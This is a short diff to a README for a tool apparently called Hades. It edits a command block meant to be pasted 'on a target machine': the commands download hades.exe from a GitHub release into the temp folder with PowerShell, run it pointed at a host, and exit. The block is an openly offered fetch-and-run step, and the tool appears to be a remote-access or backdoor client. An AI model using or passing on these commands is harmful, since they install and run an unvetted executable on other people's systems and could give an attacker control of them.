@@ -47,7 +47,7 @@ Copy and paste the commands in a cmd on a target machine.
 ```bash
 cd %TEMP%
 powershell wget "https://github.com/AntoineBRTL/Hades/releases/download/1.0/hades.exe" -outfile "h.exe"
-h.exe -c localhost
+h -c localhost
 exit
 ```
 
